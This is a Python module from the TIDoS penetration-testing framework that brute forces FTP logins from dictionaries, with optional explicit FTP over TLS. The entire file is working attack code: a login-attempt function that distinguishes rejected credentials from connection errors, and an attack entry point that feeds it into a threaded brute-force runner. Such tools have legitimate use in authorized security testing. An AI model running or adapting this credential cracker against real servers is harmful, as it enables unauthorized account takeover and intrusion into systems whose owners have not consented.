#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of FTP logins (plain FTP or explicit FTP over TLS)."""

from __future__ import annotations

import ftplib

from core.methods import brute
from core.methods.print import pbrute

info = "Brute force FTP credentials using dictionaries (supports explicit FTPS)."
searchinfo = "FTP Login Cracker"
properties = brute.options(port_default=21, threads_default=4,
                           extra={"FTP_TLS": ["Use explicit FTP over TLS (y/n)", "n"]})


def _try_login(ip, port, user, password, timeout):
    use_tls = str(properties["FTP_TLS"][1]).strip().lower() in ("y", "yes", "true", "1", "on")
    ftp = ftplib.FTP_TLS() if use_tls else ftplib.FTP()
    try:
        ftp.connect(ip, port, timeout=timeout)
    except Exception as e:
        raise ConnectionError(str(e)) from e
    try:
        if use_tls:
            ftp.auth()
        ftp.login(user, password)
        return True
    except ftplib.error_perm:
        return False            # authentication rejected
    except ftplib.all_errors as e:
        raise ConnectionError(str(e)) from e
    finally:
        try:
            ftp.close()
        except Exception:
            pass


def attack(target):
    pbrute("FTP")
    return brute.run(target, properties, proto="ftp", port_default=21,
              try_login=_try_login, lvl2="ftpbrute", threads_default=4,
              service="FTP")
